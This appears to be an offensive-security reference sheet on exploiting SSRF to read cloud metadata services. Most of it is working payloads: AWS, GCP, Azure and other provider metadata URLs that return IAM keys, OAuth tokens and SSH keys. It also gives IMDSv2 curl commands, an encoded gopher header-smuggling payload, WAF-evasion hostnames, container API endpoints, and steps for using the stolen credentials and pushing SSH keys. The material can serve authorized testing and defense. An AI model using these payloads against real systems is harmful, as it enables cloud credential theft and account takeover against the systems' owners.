# Cloud metadata SSRF — credential extraction map — Open WHEN: recon shows cloud hosting (x-amz-*/x-ms-* headers, GCP/load-balancer cookies) and the SSRF can reach a link-local metadata IP

Metadata services run on a link-local address reachable only from inside the
instance, so an SSRF that follows your URL can read them. They hand out IAM
credentials and SSH keys — usually the fastest branch of the whole chain.
Pull the role credentials, then use them with the cloud CLI/API against
broader resources.

## AWS (EC2, IMDS) — `169.254.169.254`

IMDSv1 (no header needed):
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/        list roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>  AccessKeyId/SecretAccessKey/Token
http://169.254.169.254/latest/user-data                                  startup scripts (often hold secrets)
http://169.254.169.254/latest/dynamic/instance-identity/document         accountId + region
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
```

IMDSv2 needs a token header. If the fetcher can set headers:
```
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```
If it cannot set headers, smuggle the PUT + GET over `gopher://` (see
`references/ssrf-internal-service-rce.md`) or use the IPv6 endpoint
`http://[fd00:ec2::254]/latest/meta-data/`.

WAF dodges for the metadata IP: `http://instance-data/`,
`http://169.254.169.254.nip.io/`, and the encoded IPs in
`references/ssrf-filter-bypass.md`.

### AWS ECS / Lambda
```
ECS:    /proc/self/environ -> AWS_CONTAINER_CREDENTIALS_RELATIVE_URI / UUID, then
        http://169.254.170.2/v2/credentials/<UUID>     IAM keys of the task role
Lambda: http://localhost:9001/2018-06-01/runtime/invocation/next
        http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/invocation/next
```

### Using the stolen credentials
Export `AccessKeyId` / `SecretAccessKey` / `Token` as
`AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` / `AWS_SESSION_TOKEN`, then
exercise the role (`aws s3 ls`, `aws sts get-caller-identity`, etc.) to map
what it can reach.

## Google Cloud (GCE/GKE) — `metadata.google.internal`

Requires header `Metadata-Flavor: Google` (set it, or smuggle via gopher):
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   OAuth token
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env              GKE bootstrap
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
```
The `v1beta1` path historically needed **no** header:
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```
Gopher form that sets the header for an HTTP-only fetcher:
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```
Check a leaked token's scope at
`https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<TOK>`; with a
compute scope you can push an SSH key via `setCommonInstanceMetadata`.

## Azure — `169.254.169.254`

Requires header `Metadata: true`:
```
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

## Other providers
```
DigitalOcean:  http://169.254.169.254/metadata/v1.json
Oracle Cloud:  http://192.0.0.192/latest/meta-data/
Alibaba:       http://100.100.100.200/latest/meta-data/
Hetzner:       http://169.254.169.254/hetzner/v1/metadata
OpenStack:     http://169.254.169.254/openstack
Packet:        https://metadata.packet.net/userdata
```

## Container / orchestration metadata
```
Kubernetes etcd:  http://127.0.0.1:2379/version
                  http://127.0.0.1:2379/v2/keys/?recursive=true     API keys, internal IPs
Docker API:       http://127.0.0.1:2375/v1.24/containers/json
Rancher:          http://rancher-metadata/<version>/<path>
```
